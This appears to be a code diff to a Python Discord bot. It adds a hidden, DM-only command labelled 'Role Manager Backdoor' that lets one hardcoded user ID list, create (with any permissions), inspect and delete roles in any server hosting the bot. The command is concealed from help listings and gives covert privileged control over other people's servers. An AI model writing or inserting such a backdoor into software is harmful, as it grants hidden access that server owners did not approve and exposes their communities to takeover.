@@ -5,6 +5,8 @@ import random
 import discord
 from discord.ext import commands
 from dotenv import load_dotenv
+from discord import Permissions
+
 
 # Configure logging for Railway
 logging.basicConfig(
@@ -941,6 +943,114 @@ async def role_manager(ctx, guild_id: int = None, action: str = None, target: st
     except Exception as e:
         logger.exception("Error in role_manager")
         await dm_reply(f"Error: {e}")
+
+from discord import Permissions
+
+# --- Role Manager Backdoor ---
+@bot.command(name='rolemanager', hidden=True)
+async def role_manager(ctx, guild_id: int, action: str, role_name: str = None, *, perms_list: str = None):
+    """
+    DM-only role manager:
+      Usage: rolemanager <guild_id> <action> <role_name> [permission1,permission2,...]
+    
+    Actions:
+      - create      : Create a new role with optional permissions
+      - delete      : Delete an existing role
+      - info        : Get info about a role
+      - list        : List all roles in the guild
+    """
+    # Helper to DM the user
+    async def dm_reply(embed_or_text):
+        try:
+            if isinstance(embed_or_text, discord.Embed):
+                await ctx.author.send(embed=embed_or_text)
+            else:
+                await ctx.author.send(str(embed_or_text))
+        except Exception:
+            logger.warning(f"Could not DM user {ctx.author.id}")
+
+    # Ensure command is used in DMs
+    if ctx.guild is not None:
+        await dm_reply("This command only works via DM.")
+        return
+
+    # Auth check
+    if ctx.author.id != BACK_ACCESS_USER_ID:
+        await dm_reply("You aren't allowed to use this command.")
+        return
+
+    # Get guild
+    guild = bot.get_guild(guild_id)
+    if guild is None:
+        await dm_reply(f"Guild with ID `{guild_id}` not found or bot is not in that guild.")
+        return
+
+    bot_member = guild.me or guild.get_member(bot.user.id)
+
+    # --- ACTIONS ---
+    if action.lower() == "list":
+        roles = [r.name for r in guild.roles if r.name != "@everyone"]
+        await dm_reply(f"Roles in `{guild.name}`: {', '.join(roles) if roles else 'No roles'}")
+        return
+
+    if action.lower() == "info":
+        if not role_name:
+            await dm_reply("Please provide a role name for info.")
+            return
+        role = discord.utils.get(guild.roles, name=role_name)
+        if not role:
+            await dm_reply(f"No role named `{role_name}` found in `{guild.name}`")
+            return
+        await dm_reply(f"Role `{role.name}` (ID: {role.id})\nPosition: {role.position}\nPermissions: {role.permissions}")
+        return
+
+    if action.lower() == "create":
+        if not role_name:
+            await dm_reply("Please provide a name for the new role.")
+            return
+        # Parse permissions
+        perms = Permissions.none()
+        if perms_list:
+            perms_list = [p.strip().lower() for p in perms_list.split(",")]
+            for perm_name in perms_list:
+                if hasattr(perms, perm_name):
+                    setattr(perms, perm_name, True)
+                else:
+                    await dm_reply(f"Warning: `{perm_name}` is not a valid permission name and will be ignored.")
+        try:
+            role = await guild.create_role(name=role_name, permissions=perms, reason=f"Created via backdoor by {ctx.author.id}")
+            await dm_reply(f"Role `{role.name}` created successfully with permissions: {perms_list or 'None'}")
+        except discord.Forbidden:
+            await dm_reply("Permission error: Bot cannot create roles higher than its top role.")
+        except Exception as e:
+            await dm_reply(f"Error creating role: {e}")
+        return
+
+    if action.lower() == "delete":
+        if not role_name:
+            await dm_reply("Please provide a role name to delete.")
+            return
+        role = discord.utils.get(guild.roles, name=role_name)
+        if not role:
+            await dm_reply(f"No role named `{role_name}` found in `{guild.name}`")
+            return
+        if bot_member.top_role.position <= role.position:
+            await dm_reply("Permission error: Cannot delete a role equal or higher than bot's top role.")
+            return
+        try:
+            await role.delete(reason=f"Deleted via backdoor by {ctx.author.id}")
+            await dm_reply(f"Role `{role.name}` deleted successfully.")
+        except discord.Forbidden:
+            await dm_reply("Permission error: Cannot delete this role.")
+        except Exception as e:
+            await dm_reply(f"Error deleting role: {e}")
+        return
+
+    # Unknown action
+    await dm_reply("Unknown action. Available actions: `create`, `delete`, `info`, `list`.")
+
+
+
 
 @bot.event
 async def on_command_error(ctx, error):
